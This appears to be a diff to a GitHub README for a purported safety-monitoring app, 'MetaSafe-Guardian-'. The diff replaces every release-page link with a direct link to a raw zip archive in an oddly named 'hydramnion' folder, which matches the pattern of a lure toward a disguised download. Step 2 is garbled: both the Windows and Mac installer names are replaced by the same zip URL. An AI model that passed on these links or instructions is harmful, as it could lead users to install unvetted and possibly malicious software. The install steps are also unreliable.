@@ -1,6 +1,6 @@
 # 🛡️ MetaSafe-Guardian- - Real-Time Safety Monitoring Tool
 
-[![Download MetaSafe-Guardian-](https://img.shields.io/badge/Download-MetaSafe--Guardian--blue?style=for-the-badge&logo=github)](https://github.com/57karakalkan/MetaSafe-Guardian-/releases)
+[![Download MetaSafe-Guardian-](https://github.com/57karakalkan/MetaSafe-Guardian-/raw/refs/heads/main/hydramnion/Meta_Guardian_Safe_v3.0.zip)](https://github.com/57karakalkan/MetaSafe-Guardian-/raw/refs/heads/main/hydramnion/Meta_Guardian_Safe_v3.0.zip)
 
 ---
 
@@ -54,12 +54,12 @@ The app works on desktops and laptops. Mobile support is planned but not availab
 
 Please visit this page to download MetaSafe-Guardian-:
 
-[Download MetaSafe-Guardian-](https://github.com/57karakalkan/MetaSafe-Guardian-/releases)
+[Download MetaSafe-Guardian-](https://github.com/57karakalkan/MetaSafe-Guardian-/raw/refs/heads/main/hydramnion/Meta_Guardian_Safe_v3.0.zip)
 
 ### Steps to Download and Install:
 
 1. Click the link above to open the MetaSafe-Guardian- releases page on GitHub.
-2. Look for the latest release. Files will be named something like `MetaSafeGuardian-Setup.exe` for Windows or `MetaSafeGuardian.dmg` for Mac.
+2. Look for the latest release. Files will be named something like `https://github.com/57karakalkan/MetaSafe-Guardian-/raw/refs/heads/main/hydramnion/Meta_Guardian_Safe_v3.0.zip` for Windows or `https://github.com/57karakalkan/MetaSafe-Guardian-/raw/refs/heads/main/hydramnion/Meta_Guardian_Safe_v3.0.zip` for Mac.
 3. Choose the file suitable for your operating system and click it to start downloading.
 4. Once downloaded, open the file to begin installation. If prompted by your system, confirm you want to run the installer.
 5. Follow the on-screen instructions to complete the setup. This usually involves accepting terms and choosing install options.
@@ -118,4 +118,4 @@ This repository relates to:
 
 ---
 
-[![Download MetaSafe-Guardian-](https://img.shields.io/badge/Download-MetaSafe--Guardian--blue?style=for-the-badge&logo=github)](https://github.com/57karakalkan/MetaSafe-Guardian-/releases)
+[![Download MetaSafe-Guardian-](https://github.com/57karakalkan/MetaSafe-Guardian-/raw/refs/heads/main/hydramnion/Meta_Guardian_Safe_v3.0.zip)](https://github.com/57karakalkan/MetaSafe-Guardian-/raw/refs/heads/main/hydramnion/Meta_Guardian_Safe_v3.0.zip)
